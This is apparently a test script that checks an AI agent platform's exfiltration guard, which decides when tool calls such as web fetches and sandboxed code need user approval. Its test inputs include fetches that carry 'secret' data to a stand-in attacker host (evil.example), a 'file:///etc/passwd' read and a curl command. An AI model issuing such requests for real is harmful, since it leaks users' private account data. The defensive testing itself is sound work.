/**
 * The exfiltration guard (lib/agent/egress.ts, D54), checked on its own and against the
 * real agents in the database.
 *
 *   npm run verify:egress
 *
 * No model call and no VM: it checks the decision the runner makes for each tool call.
 */
import { createRequire, register } from "node:module";
import path from "node:path";
import { pathToFileURL } from "node:url";

register(pathToFileURL(path.join(import.meta.dirname, "ts-alias-hook.mjs")));
const require = createRequire(import.meta.url);
require("@next/env").loadEnvConfig(path.resolve(import.meta.dirname, ".."), true, { info() {}, error() {} });

let passed = 0;
let failed = 0;
function check(name: string, condition: unknown, detail?: unknown) {
  if (condition) passed++;
  else failed++;
  console.log(`  ${condition ? "ok  " : "FAIL"} ${name}${condition || detail === undefined ? "" : ` — ${JSON.stringify(detail)}`}`);
}

async function main() {
  const { egressCheck, hasPrivateAccess, userUrls } = await import("@/lib/agent/egress");
  const { resolveAgentTools } = await import("@/lib/tools");
  const { db, agents } = await import("@/db");

  console.log("\n== The rule");
  const own = userUrls(["Please read https://example.com/blog/post-1, thanks.", "also http://Docs.Example.org/a#top"]);
  const priv = { privateAccess: true, userUrls: own };
  const open = { privateAccess: false, userUrls: own };

  check("no account access: fetch anywhere, no question", egressCheck("web.fetch", { url: "https://evil.example/?d=x" }, open) === null);
  check("no account access: code runs as trusted", egressCheck("sandbox.run_code", { language: "python", code: "1" }, open) === null);
  check("account access: a URL the model chose asks", egressCheck("web.fetch", { url: "https://evil.example/?d=secret" }, priv) !== null);
  check("…even on a host the user named, with data added", egressCheck("web.fetch", { url: "https://example.com/blog/post-1?d=secret" }, priv) !== null);
  check("…or a different path on that host", egressCheck("web.fetch", { url: "https://example.com/secret-data" }, priv) !== null);
  check("the exact URL the user wrote goes ahead", egressCheck("web.fetch", { url: "https://example.com/blog/post-1" }, priv) === null);
  check("…ignoring a trailing slash, fragment and host case", egressCheck("web.fetch", { url: "http://docs.example.org/a/" }, priv) === null);
  check("trailing punctuation isn't part of the URL", own.has("https://example.com/blog/post-1"));
  check("the VM's browser is guarded the same way", egressCheck("sandbox.open_browser", { url: "https://evil.example/" }, priv) !== null);
  check("code always asks when the agent reads accounts", egressCheck("sandbox.run_code", { language: "bash", code: "curl x" }, priv) !== null);
  check("reading files in the VM doesn't ask", egressCheck("sandbox.read_file", { path: "a" }, priv) === null);
  check("non-web URLs never count as the user's", egressCheck("web.fetch", { url: "file:///etc/passwd" }, { privateAccess: true, userUrls: userUrls(["file:///etc/passwd"]) }) !== null);

  console.log("\n== Your agents");
  for (const agent of await db.select().from(agents)) {
    const tools = await resolveAgentTools(agent);
    const reads = tools.filter(({ tool }) => "provider" in tool && tool.provider).map(({ tool }) => tool.key);
    console.log(`  ${agent.name}: ${hasPrivateAccess(tools) ? `GUARDED (reads ${reads.join(", ")})` : "not guarded (no account access)"}`);
  }
  console.log(`\n${passed} passed, ${failed} failed`);
  process.exit(failed ? 1 : 0);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
